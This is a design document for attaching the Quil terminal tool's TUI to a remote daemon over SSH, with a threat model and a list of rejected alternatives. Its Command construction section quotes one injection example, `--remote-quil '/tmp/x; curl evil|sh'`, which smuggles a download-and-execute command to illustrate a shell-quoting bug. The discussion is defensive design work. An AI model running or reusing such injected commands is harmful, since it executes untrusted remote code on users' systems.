# Remote Daemon — Attaching a TUI Across the Network

**Date:** 2026-07-27
**Status:** Design under review

## Problem

Quil's daemon and TUI run on one machine and talk over a Unix domain socket at
`~/.quil/quild.sock`. The goal is to run `quild` on a cluster server and attach
the TUI from a laptop, across networks — SSH-reachable hosts, WireGuard/Tailscale
meshes, and the public internet — with a connection that is stable, robust, and
secure.

The transport itself is trivial to move. The security model and the TUI's
filesystem assumptions are not.

### What the current transport actually is

There are exactly two transport call sites in the repository:

- `internal/ipc/server.go:311` — `net.Listen("unix", s.path)`, then
  `os.Chmod(s.path, 0600)`
- `internal/ipc/client.go:14` — `net.Dial("unix", socketPath)`

The protocol has no authentication, no authorization, and no encryption,
because a `0600` Unix socket already answers *who are you* (same UID) and *can
anyone eavesdrop* (kernel memory, never a wire). **The socket is the auth.**

That implicit trust is load-bearing. Any client that reaches the socket can:

- `MsgCreatePane` — spawn arbitrary processes on the daemon host
- `MsgPaneInput` — type raw bytes into any pane's stdin, including live
  `claude --dangerously-skip-permissions` sessions
- receive `MsgPaneOutput` broadcasts of every pane's output
- `MsgShutdown` — stop the daemon

An unauthenticated TCP listener would therefore not be "a remote feature with a
security gap." It would be a remote code execution service. Conversely, because
the trust lives in the transport rather than in the protocol, replacing the
transport with an equally-authenticated one preserves the model exactly, with no
protocol redesign.

## Decisions

| Question | Decision |
|---|---|
| Scope | Remote-correct **core**: pane creation reads the server's filesystem. Notes, image paste, and the daemon-log viewer stay laptop-local and are documented or disabled. |
| Topology | **One daemon per TUI process.** `quil --remote gpu01` binds entirely to the cluster daemon; `quil` alone stays local. Two workspaces means two TUI processes. `Model` is untouched — it already assumes exactly one daemon. |
| Transport | **SSH now, behind a dialer seam.** A TLS/mTLS backend is not written; the seam is all this design owes it. |
| Plugin metadata | Served by a **daemon RPC** with server-side availability detection. |

## Non-goals

- **Multi-user.** One daemon serves one UID and one human. Read-only observers,
  per-actor authorization, and audit of who did what are all out of scope. See
  *Security* for why this matters to the mTLS seam.
- **One TUI showing local and remote workspaces simultaneously.** That requires
  `Model` to hold N clients, N workspace states, and N layout trees, and to
  route every message — a refactor touching every `Update` branch.
- **Switching the connection at runtime.** A TUI binds to one daemon at startup.
- **mTLS.** Deferred deliberately; the dialer seam keeps it a config change
  rather than a refactor.
- **Remote notes, remote image paste, remote plugin editing.** Named explicitly
  in *Disabled surfaces*.

## User-facing behavior

```
quil                          # local, unchanged
quil --remote gpu01           # attach to the daemon on gpu01
quil --remote user@gpu01
quil --remote gpu01 --remote-quil /opt/bin/quil
```

The `--remote` value is handed to `ssh` **verbatim**. It is never parsed into
user/host/port and reassembled, because `gpu01` is very likely a `Host` alias in
`~/.ssh/config` carrying `HostName`, `Port`, `User`, and `ProxyJump` — and a
bastion hop is near-certain for a cluster. Reassembling would silently discard
all of it.

The status bar shows the target alongside the existing `[dev]` indicator. On
connection loss the TUI shows a reconnect banner and freezes input rather than
exiting.

## Architecture

### The dialer seam

`internal/ipc` gains one constructor. `NewClient(socketPath)` is unchanged for
the six existing call sites.

```go
// DialFunc establishes one transport-level connection to a daemon.
type DialFunc func(ctx context.Context) (net.Conn, error)

func NewClient(socketPath string) (*Client, error)
func NewClientWithDialer(ctx context.Context, d DialFunc) (*Client, error)
```

Backends live in a new `internal/transport`, returning the bare
`func(context.Context) (net.Conn, error)` signature so the package imports
nothing from `ipc`:

- `transport.Local(sock)` — `net.Dial("unix", sock)`
- `transport.SSH(dest, opts)` — below
- `transport.TLS(...)` — **not written**

### SSH backend

```
quil --remote gpu01
  └─ exec: ssh -T <forced opts> gpu01 "quil --stdio"
       └─ server: ensure daemon, dial ~/.quil/quild.sock, io.Copy both ways
```

`quil --stdio` — **not `quild --stdio`.** The daemon-ensure logic lives in the
TUI binary (`startDaemon` at `cmd/quil/main.go:173`, `waitForDaemonReady` at
`cmd/quil/daemonctl.go:224`, `findDaemonBinary` at `cmd/quil/main.go:141`);
`cmd/quild/` contains none of it. Release archives ship both binaries together,
so `quil` is present wherever `quild` is.

Handled as a case in `main()`'s switch (`cmd/quil/main.go:90-111`), which runs
before `launchTUI` and therefore skips the version gate, `EnsureDefaultPlugins`,
`restoreWindowSize`, and `maybeApplyStagedUpdate`. The laptop's handshake then
runs over the pipe against the *remote* daemon, which is the comparison we want.

Concurrent `quil --stdio` invocations are safe: the single-instance guard
(`cmd/quild/guard.go:31`) performs a real `MsgVersionReq` handshake, and a
redundant `quild --background` exits cleanly.

Four details are load-bearing rather than incidental:

- **`startDaemon` must run with `quiet=true`.** Stdout *is* the IPC channel; a
  "daemon started" line would corrupt the first frame.
- **`-T` is mandatory.** A PTY would apply CRLF translation and corrupt the
  4-byte big-endian length prefix — silent frame corruption, not a clean failure.
- **First dial is interactive; reconnects use `BatchMode=yes`.** The first dial
  happens before Bubble Tea takes the screen, so host-key TOFU and passphrase
  prompts work. Reconnects happen under raw mode with no terminal available and
  must fail fast. On Windows this matters more than it appears: `ssh` prompts
  read `CONIN$` directly rather than stdin, so a prompt during a raw-mode
  session garbles or deadlocks the display.
- **PATH.** `ssh host "quil --stdio"` runs a non-interactive shell, which often
  lacks `~/.local/bin` — the target `scripts/install.sh` uses. The remote
  command must be overridable with an absolute path.

`ssh`'s own stderr is captured to a ring buffer and surfaced on failure; its
messages (`Permission denied (publickey)`, `Host key verification failed`) are
better than anything we would write.

### The stdio adapter and deadlines

`exec.Cmd`'s `StdinPipe`/`StdoutPipe` are wrapped in a `net.Conn`. Deadlines are
implemented **inside the adapter** — a pump goroutine plus a timer returning a
`net.Error` with `Timeout() == true`, *without* closing the connection.

This is not optional polish. Three call sites depend on `SetReadDeadline`:
`cmd/quil/handshake.go:82`, `cmd/quild/guard.go:54` (server-side, unaffected),
and `statusRoundTrip` in `cmd/quil/status.go:405,420`. Today a handshake timeout
clears the deadline (`handshake.go:86`) and leaves the connection **usable** —
the `DaemonUnknown` flow continues on it. Rewriting the handshake to close the
connection on timeout would change that contract, introduce a success-vs-timer
race, and break `quil status`. A deadline-capable adapter keeps both working
unchanged.

Platform note: on Linux and macOS `os.Pipe` is pollable and real deadlines work,
so the adapter delegates. Only on Windows are the pipes non-overlapped, and only
there does the pump-and-timer path engage.

Windows child lifetime: close stdin, `Process.Kill`, then `cmd.Wait` to reap.
For deterministic cleanup when the TUI dies hard, put `ssh.exe` in a job object
with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` (`golang.org/x/sys/windows` is already
a dependency via `parentwatch_windows.go`), and give it
`CREATE_NEW_PROCESS_GROUP` so a console `CTRL_BREAK_EVENT` aimed at the TUI
cannot kill the transport mid-session.

### Remote-mode guards

`startDaemon`, `stopDaemonEscalating`, and `restartDaemonForUpgrade` each gain
an early guard that refuses in remote mode.

This is the highest-severity correctness issue in the design, and it is not
hypothetical. Without deadline support the handshake returns
`DaemonUnknown: true`; `gateVersionCheck` (`cmd/quil/version_gate.go:51`) falls
to its `default:` branch and calls `restartDaemonForUpgrade()`, which reads
`config.SocketPath()` and `config.PidPath()` **internally** — the laptop's. A
release-build TUI connecting to a remote daemon would offer to "restart the
daemon" and, on yes, SIGKILL the user's *local production* daemon while the
remote one sat untouched.

The guard belongs inside those three functions rather than at their call sites,
precisely because the hazard is the hidden global read. Nothing at a call site
looks remote-unsafe: a reviewer scanning `gateVersionCheck` sees
`restartDaemonForUpgrade()` with no arguments and no hint that it will kill a
daemon on another machine's behalf.

In remote mode the version-gate mismatch path must therefore print a
remote-specific message — *"remote daemon at gpu01 reports version X, this TUI is
Y; upgrade one of them"* — and exit. Both the `Cmp > 0` and `DaemonUnknown`
flows otherwise drive toward a restart the guard now refuses, leaving no
remediation path without new messaging.

`quil daemon stop|restart` and `quil restart` refuse under `--remote`. F1 →
About → Stop daemon is kept, relabelled "Stop remote daemon (gpu01)": it is
recoverable, since the next `quil --remote` restarts it via `quil --stdio`.

### Reconnect

Local mode keeps today's behavior — a receive error is fatal, because a dead
local daemon is fatal. Remote mode distinguishes *link dropped* from *daemon
asked us to quit*: `MsgCloseTUI` also returns `QuitMsg` (`model.go:3715`), and
only the former reconnects.

On loss: banner, **input frozen**, exponential backoff with jitter capped around
30 s, unbounded retries, Ctrl+Q to give up. Freezing input is a deliberate
fail-closed choice — buffering keystrokes into a dead link and replaying them
later into a live agent session is worse than a visible stall. Budget the
backoff for Windows, where OpenSSH has no ControlMaster and every attempt is a
full TCP and auth handshake.

Two resets are mandatory **before** replayed state lands:

- **VT and scrollback.** `handleAttach` (`internal/daemon/daemon.go:889-983`)
  replays the entire `OutputBuf` as `Ghost` chunks on *every* attach;
  `applyWorkspaceState` preserves existing `PaneModel`s
  (`internal/tui/model.go:2763-2775`) and `handlePaneOutput` appends
  unconditionally (`:2713`). Without a reset, reconnect doubles every pane's
  scrollback. Reset VT, raw ring, scroll offset, and selection for **every**
  pane — including terminal-type panes. The existing "terminal panes skip
  `ResetVT`" rule targets restore-time contamination, which is a different case.
- **Work state.** `applyWorkTransition` (`internal/tui/model.go:1161`) has no
  dedup, so replayed `hook.claude.SubagentStart` events re-increment the
  subagent counter on a pane whose counter already reflects them, wedging the
  spinner until `SessionEnd`. The notification sidebar is already safe —
  `AddEvent` dedups by event ID (`internal/tui/notification.go:46-60`). Either
  reset work state on reconnect or filter replayed events by seen ID.

Lesser items: ghost flags re-set, so panes re-dim "restored" until the next live
output (cosmetic); `sawFirstState` (`model.go:387-394`) must survive the
reconnect or the update notice reopens. And because `Model` is a value type,
every in-flight `tea.Cmd` closure captured the *old* client — the design must
guarantee exactly one listen loop on the new client, and that stale loops
erroring on the dead client are ignored rather than mapped to `Quit`.

There is no application-layer liveness check: `MsgHeartbeat` is declared
(`internal/ipc/protocol.go:16`) but never sent anywhere in the codebase. Dead-link
detection rests entirely on `ServerAliveInterval=15` /
`ServerAliveCountMax=3`, which makes `ssh` exit and EOF the pipes in roughly 45
seconds. That also supplies the liveness detection the lost 30 s write deadline
in `internal/ipc/server.go:260` used to provide.

### Remote-correct RPCs

Four new request/response pairs. Each follows the established pattern from
`internal/daemon/claudesessions.go:93-142`: a **worker goroutine** (file I/O must
never run on the conn dispatch goroutine — the documented wedge class), a
**per-RPC single-flight atomic** (separate, never shared: the comment at
`claudesessions.go:199-207` explains that a shared atomic fails exactly when the
user needs it), and a response that **echoes the request key** so the TUI can
drop stale replies.

| RPC | Wraps | Replaces |
|---|---|---|
| `MsgBrowseDirReq` | `os.ReadDir` | `loadBrowseDirAndSelect` `dialog.go:2323`, symlink `Stat` `:2339` |
| `MsgGitDiscoverReq` | `gitdiscover.Candidates` | `dialog.go:2214`, `overlay.go:50` |
| `MsgKubeContextsReq` | `kubediscover.Contexts` | `dialog.go:2241` |
| `MsgListPluginsReq` | daemon registry + `DetectAvailability` | `cmd/quil/main.go:328-339` |

The browse RPC owns root, parent, and home semantics **server-side**, replacing
three pieces of laptop-OS logic: `loadDriveList` (`dialog.go:2378`, which
enumerates Windows drive letters — a meaningless concept against a Linux
server), the `filepath.Dir(abs) != abs` root test (`:2349`), and the
`os.UserHomeDir()` browse seed (`:2288`). `~` expansion in
`validateAndNormalizeCWD` (`:3224`) likewise needs a server-side answer; client
validation can otherwise be skipped in remote mode, since `handleCreatePane`
already resolves and validates server-side.

The browse response **caps entries and sets a `Truncated` flag**, mirroring
`claudesessions.MaxSessions`. This is not optional: `maxFrameSize` is 10 MiB
(`internal/ipc/protocol.go:589`), `EncodeFrame` errors above it (`:600-602`), and
`respondTo` (`internal/daemon/daemon.go:2451-2459`) **discards `conn.Send`'s
error return** — so an oversized response vanishes with only a producer-side log
while the TUI waits out its timeout and reports what looks like a wedged daemon.
A capped response is a single ~1–2 MB critical frame, one slot of the 64-deep
queue; no pagination is needed under a cap.

`MsgListPluginsReq` closes the largest gap found in review. Today the TUI runs
`EnsureDefaultPlugins`, `LoadFromDir`, and `DetectAvailability`
(`internal/plugin/registry.go:184-218`) on the **laptop**, while panes spawn from
the **server's** registry. `DetectAvailability` runs `LookPath` on the wrong
machine, so a plugin greys out that would spawn fine, or the reverse. It also
affects the Ctrl+N list contents, `prompts_cwd` / `toggles` / `sessions` /
`discover` metadata, `record_history` gating, `raw_keys`, and `wide_canvas`.

Claude session listing needs no work — already daemon-side
(`internal/daemon/claudesessions.go:93`, `:208`), with the TUI doing pure IPC.

Dialogs become **async in both modes**, local answering immediately via a
`tea.Cmd`, so there is one code path and local development exercises it. The
template already exists in `ensureSessionScan` / `claudeSessionsRespMsg`
(`internal/tui/sessions.go:109-138`, `model.go:1219-1229`), including the
echoed-key staleness check and the local timeout tick that must **not** re-arm
`listenForMessages`. The hardest piece is `initSetupBrowser`'s fallback cascade
(`dialog.go:2291-2303`: `lastSelectedCWD` → active pane CWD → home, skipping
failures), which becomes a small state machine requesting the next candidate on
each error response.

`AttachPayload.CWD` is sent **empty** in remote mode. `defaultCWD`
(`internal/daemon/daemon.go:2286`) validates with `os.Stat` + `EvalSymlinks` and
falls back to the daemon's own directory, so a Windows path degrades safely —
but a path existing on *both* machines (`/home/user`) would silently pass, which
is worse than not sending one.

`recent-cwds.json` must be keyed per target, or laptop and server paths mix in
one list. `existingDirs` (`dialog.go:2268`) filters those entries against the
laptop filesystem and must move behind the browse RPC.

### Disabled surfaces in remote mode

Disabled rather than left to misbehave:

- **Image paste** (`model.go:4143-4172`) — writes a PNG to the laptop's
  `PasteDir()` and types that path into a server PTY. Guaranteed garbage.
- **Alt+G lazygit overlay** — candidates come from server CWD paths checked
  against the laptop filesystem (empty), and the binary-availability check
  probes the wrong machine.
- **Plugin TOML editor** (`editor.go:767`) and **schema-migration dialog**
  (`migration.go:153-167`) — they edit laptop files the remote daemon never
  reads.
- **Update apply.** The daemon stages on the server; the TUI's "Update now"
  (`main.go:371-381`) applies laptop-staged files that do not exist.
- **`quil --remote <host> mcp`** — refused outright by `refuseRemoteMCP()` at the
  top of `runMCP`, before any dial. **The original framing of this item was
  wrong and the correction matters.** It was recorded as "auto-starts a fresh
  local daemon", implying it fails loudly. In fact `connectToDaemon`
  (`cmd/quil/mcp.go:194`) returns as soon as `ipc.NewClient(sockPath)` succeeds,
  so whenever a local daemon is already running — the normal state on a
  developer's own machine — the bridge attached to the **local** daemon with no
  error at all, while the AI client believed it was driving the remote host.
  `create_pane` / `send_to_pane` / `destroy_pane` would then act on the user's
  live local session. Silent wrong-target, not fail-closed. Found by the final
  whole-branch review, which overturned an earlier ruling of mine.
  The supported topology is unchanged: run `quil mcp` **on the remote host**,
  inside a pane there.

Documented but not disabled:

- **Notes** (`model.go:1789`) stay in the laptop's `NotesDir()`.
- **The "Daemon log" viewer** (`dialog.go:443`, `palette.go:888`) opens the
  laptop's `quild.log`, not the server's. `quil.log` is genuinely local.
- **Settings rows for daemon-owned fields** (snapshot interval, ghost buffer
  lines, update check/auto) write to the laptop `config.toml` the remote daemon
  never reads — silent no-ops.
- **`quil status`** reads the laptop PID file and environment
  (`status.go:468`, `:499`, `:101`); remote status needs the dialer with PID and
  uptime suppressed, or stays local-only. Note that `runStatus` dials
  `config.SocketPath()` directly and is **not** one of the three guarded
  functions, so under `--remote` it silently reports on the *local* daemon. It
  is read-only, so it misleads rather than damages — but it is the same "which
  daemon am I actually talking to" class as the MCP case above, and Phase 2 or 3
  should close it. Flagged by the final whole-branch review.

## Security

> **Provenance.** Two delegated review agents were dispatched for an independent
> security assessment and neither returned output. The analysis below is
> first-party. It should be treated as un-reviewed by a second party and is a
> good candidate for external review before implementation.

### Threat model

The trust boundary is the SSH channel. The core claim is that this design grants
**zero privilege escalation**: anyone who can `ssh` to that host as that user
already has a full shell, which strictly exceeds what the quil protocol offers.
The daemon is unchanged, still listens only on its `0600` Unix socket, and **no
network port is ever opened on the server**.

**Verdict: sound, with four caveats.**

**1. Forced-command keys are a trap.** An operator who writes
`command="quil --stdio"` in `authorized_keys` to create a "quil-only restricted
key" has actually granted **full shell**, because `MsgCreatePane` spawns
arbitrary processes. The same applies to restricted shells and sftp-only
accounts. The general rule is that SSH access is not always equivalent to shell
access — but *quil access always is*. This must be stated bluntly in user docs:
never use a forced-command key to limit someone to quil.

**2. Revocation is incomplete.** Removing an `authorized_keys` entry stops new
connections. It does not kill the running daemon or its panes; long-lived agent
sessions keep executing.

**3. Trust direction is new, and mitigated.** Locally, trusting the daemon is
free. Remotely, a compromised server feeds bytes into the laptop's TUI. Assessed
capability is confined to the TUI process: quil's VT emulator **re-renders
cells** rather than passing raw escapes to the host terminal, which is a strong
structural mitigation; OSC 0/1/2 are stripped (`internal/tui/oscfilter.go`); and
there is **no OSC 52 path** — every `clipboard.Write` call is user-action-driven
(`model.go:639`, `:655`, `:2394`) and `clipboard.Read` fires only from paste
keypresses, so pane output can never reach the system clipboard. `MsgCloseTUI`
can quit the TUI; `MsgSetActivePane` and `MsgHighlightPane` are cosmetic.
Acceptable.

**4. Operational exposure increases.** Unattended AI agent sessions now run on a
shared cluster, drivable by anyone holding that UID.

### Same-UID sibling panes

Panes spawned by the daemon run as the same UID and can dial the socket
themselves, so any code in any pane already controls every other pane. The
remote design adds no new capability — `quil --stdio` only proxies to a socket
the same user could dial directly. What changes is operational: the exposure
moves from a machine the user physically controls to a shared cluster.

### Command construction

`ssh` concatenates its command arguments and hands them to the remote **login
shell**, so a value like `--remote-quil '/tmp/x; curl evil|sh'` executes. This
is a **robustness bug, not a vulnerability**: the person passing the flag already
has shell on that host.

It remains a non-vulnerability only under a constraint the design must hold:
remote targets and remote command paths come from the CLI or the user's own
config, **never** from a shared or committed config file. Every component is
shell-quoted regardless, because paths containing spaces breaking silently is
the practical failure mode.

### Forced ssh options

OpenSSH's rule is *first obtained value wins*, and command-line `-o` is processed
before configuration files — so forcing works.

```
-o ForwardAgent=no  -o ForwardX11=no  -o ForwardX11Trusted=no
-o PermitLocalCommand=no  -o ClearAllForwardings=yes  -o RequestTTY=no
```

`ClearAllForwardings=yes` neutralizes `LocalForward`, `RemoteForward`, and
`DynamicForward` from the user's config in one option rather than enumerating
each. Left alone deliberately: `ProxyCommand` and `ProxyJump` (bastions are a
core requirement), `IdentityFile`, `IdentityAgent`, `User`, `HostName`, `Port`,
`Ciphers`/`KexAlgorithms` (the user's crypto policy), and `ControlMaster`.

### Host keys

`StrictHostKeyChecking` is **not** forced. `accept-new` is weaker than the
default prompt, and the interactive-first-dial plus `BatchMode`-on-reconnect
split already yields the right behavior: a changed host key mid-session fails
rather than prompting invisibly.

Instead, detect and warn — run `ssh -G <dest>` at first connect and warn if the
effective configuration reports `stricthostkeychecking no`.

### Frame limits

The read side is already safe: `ReadMessage` checks `length > maxFrameSize`
(`internal/ipc/protocol.go:630`) **before** `make([]byte, length)` (`:634`), so a
hostile peer cannot drive a large allocation. The ceiling is one 10 MiB buffer at
a time, since the client reads sequentially in `listenForMessages`.

### The mTLS seam

"The transport is the auth" is **not a trap for single-user**. mTLS authenticates
the connection exactly as SSH does, so a TLS backend slots into the same boundary
with no per-message retrofit — provided the daemon keeps treating *connected
implies fully authorized*. It becomes a trap only if multi-user, read-only
observers, or per-actor audit are ever wanted, which is why those are named
non-goals above.

One cheap forward-compatible step is worth taking now: record a per-connection
identity string at accept time (`local`, `ssh:<dest>`, later `mtls:<CN>`) and log
it. Roughly twenty lines, and it makes any later authorization or audit work
additive rather than archaeological.

## Implementation phases

This is too large for one implementation plan. It decomposes into three, each
independently shippable and independently testable.

**Phase 1 — transport and safety.** The dialer seam, `internal/transport` with
the Local and SSH backends, the stdio adapter with working deadlines,
`quil --stdio`, the three remote-mode guards, and the remote-specific
version-gate message. Ends with a TUI that attaches over SSH and creates panes
by typing absolute server paths by hand. The guards ship in this phase, not a
later one — they are what makes the phase safe to use at all.

**Phase 2 — reconnect.** Link-loss detection distinguished from `MsgCloseTUI`,
the backoff loop, input freeze and banner, the VT/scrollback reset and the
work-state reset, and the single-listen-loop guarantee across the client swap.
Ends with a session that survives a laptop sleep.

**Phase 3 — remote-correct dialogs.** The four RPCs, the async dialog refactor,
per-target `recent-cwds.json`, empty `AttachPayload.CWD`, and the disabled
surfaces. Largest and least dangerous; it is also the phase most likely to
regress the setup dialog's pinned height and rendering invariants.

## Testing

- **Regression canary:** assert `startDaemon`, `stopDaemonEscalating`, and
  `restartDaemonForUpgrade` all return an error in remote mode. This is the test
  that prevents the local-daemon-kill bug from returning.
- **Stdio adapter:** `net.Conn` contract; deadline behavior on both platform
  paths; `Close` reaps the child.
- **Spec parsing:** table test pinning that the destination is preserved
  verbatim, including `ssh_config` alias forms.
- **Handshake:** against a fake `net.Conn` whose deadlines behave like the
  Windows pipe path, proving `handshake.go` and `statusRoundTrip` still work.
- **Reconnect:** fake dialer failing N times then succeeding; assert bounded
  backoff, exactly one live listen loop, VT reset before replay, and no
  work-state double-count on replayed `SubagentStart` events.
- **Browse RPC:** entry cap and `Truncated`; a response that would exceed
  `maxFrameSize` must be impossible by construction.
- **End-to-end without ssh:** drive `quil --stdio` directly via `exec`, which
  exercises the whole proxy path with no SSH server required.
- **Windows:** build and run the test binary natively per the repo's documented
  `go test -c` workflow; `GOOS=windows` vet only proves it compiles.

## Rejected alternatives

### Relay / broker service with a connection UUID

Rejected 2026-07-27. An intermediate service both endpoints dial out to, pairing
them by connection UUID so neither needs the other's address.

The UUID is the fatal part. It would be a **bearer token** — possession is
authorization — for a protocol whose `MsgCreatePane` is arbitrary process
execution. Bearer tokens leak structurally rather than occasionally: pasted into
chat to share a session, left in shell history, captured in screenshots,
committed in config, logged by the relay itself. And they are long-lived by
design, since reuse is the whole appeal. SSH private keys have the opposite
properties — never transmitted, optionally non-exfiltratable in hardware,
revocable per device by editing one file.

The one problem a relay genuinely solves is NAT traversal for a host with no
public IP and no inbound port. A cluster server generally has neither problem.
Against that narrow benefit: operating a 24/7 service that becomes a single point
of failure for every user, inheriting an identity and abuse-handling system,
bandwidth costs that scale with continuous PTY streaming, and routing other
people's terminal sessions — secrets included — through infrastructure the
maintainer operates.

It is also unnecessary. An overlay network (Tailscale, WireGuard) already
provides NAT traversal, stable names instead of addresses, device identity, and
end-to-end encryption, operated and audited by someone else — and needs **zero
quil code**, since `quil --remote gpu01` works over it unchanged.

Most importantly, the escape hatch already ships. Because `--remote` is passed
verbatim to `ssh`, any relay attaches through `ProxyCommand` with quil knowing
nothing about it:

```
Host gpu01
    ProxyCommand cloudflared access ssh --hostname %h
```

Cloudflare Tunnel, Teleport, boringproxy, or a bespoke relay all plug in there.

Revisit only if quil becomes a product for users who cannot configure SSH keys or
install an overlay network. Even then, depend on an existing tunnel provider
rather than operating one, keep the broker rendezvous-only so it never sees
plaintext, and demote the UUID to an identifier alongside real per-device keys.

### Embedded `golang.org/x/crypto/ssh`

Rejected in favour of the system `ssh` binary. The library's
`Client.Dial("unix", sock)` returns a genuine `net.Conn` and would need no
server-side change at all — no `quil --stdio` subcommand. But it parses no
`ssh_config`, so `ProxyJump`/bastions, `ControlMaster`, and `Match` blocks would
all have to be reimplemented; Windows agent access is a named pipe rather than
`SSH_AUTH_SOCK`; and quil would own host-key-algorithm and cipher configuration
that OpenSSH curates. Its `chanConn` also hard-fails every deadline setter,
which the stdio adapter has to solve regardless.

### Native mTLS listener now

Deferred, not rejected outright — see *The mTLS seam*. Building it now would make
quil a CA responsible for issuance, expiry, storage, and revocation, and would
put a pre-authentication port on the cluster in front of a protocol that grants
arbitrary process execution. The dialer seam keeps it a later config change
rather than a refactor.

## Open questions

1. Whether `quil status` gains remote support or stays documented local-only.
2. Whether the Settings dialog hides daemon-owned rows in remote mode or shows
   them disabled with an explanation.
3. Whether notes should later move daemon-side; the storage is already atomic and
   pane-keyed, so it is a contained follow-up rather than a redesign.
